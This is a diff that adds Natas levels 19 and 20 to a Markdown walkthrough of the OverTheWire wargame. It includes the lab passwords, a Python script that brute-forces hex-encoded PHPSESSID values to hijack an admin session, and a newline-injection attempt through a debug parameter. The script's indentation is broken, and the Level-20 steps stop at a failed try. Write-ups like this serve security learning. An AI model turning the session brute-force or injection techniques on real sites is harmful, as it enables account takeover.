@@ -699,6 +699,77 @@
 
 
 
+ - ## Level-19
+- Username : natas19
+- Password : tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
+- Domain : http://natas19.natas.labs.overthewire.org
+
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas19.natas.labs.overthewire.org, Then login with username and password
+
+- Step 2: Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+-     import requests
+      import re
+
+      username = 'natas19'
+      password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
+
+      url = 'http://natas19.natas.labs.overthewire.org'
+
+      for i in range(641):
+
+       session = requests.Session()
+      print("Trying with: " + str(i))
+
+      response = session.get(
+        url,
+        cookies={
+            "PHPSESSID": ("%d-admin" % i).encode().hex()
+        },
+        auth=(username, password)
+      )
+
+      if "You are an admin" in response.text:
+        print(response.text)
+        break
+  
+- Step 3: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the password for Natas20
+
+ <img width="457" height="527" alt="image" src="https://github.com/user-attachments/assets/9a4e27cc-b5df-4b9f-9734-2f8be4032aaf" />
+
+- Step 4: Finally it will get the password for Natas20
+
+  <img width="1232" height="541" alt="image" src="https://github.com/user-attachments/assets/61d3c20d-8170-4a26-a90b-c8f5d8905a0b" />
+
+
+
+- ## Level-20
+- Username : natas20
+- Password : p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+- Domain : http://natas20.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas20.natas.labs.overthewire.org, Then login with username and password
+
+- Step 2: click on view sourcecode once check it
+- Step 3: In a code it has a debug , So we will use it, at the along with the natas20 link type (?debug)
+
+  <img width="1287" height="426" alt="image" src="https://github.com/user-attachments/assets/0375d115-7a20-40b2-b10d-7bb1dc18e467" />
+
+- Step 4: Using try\nadmin 1 , But there is no output
+
+  <img width="956" height="473" alt="image" src="https://github.com/user-attachments/assets/e4e1d9e9-6eaf-4039-96ff-803dec44b8dc" />
+
+
+
+
+
+
+
+
+
+
+
 
 
 
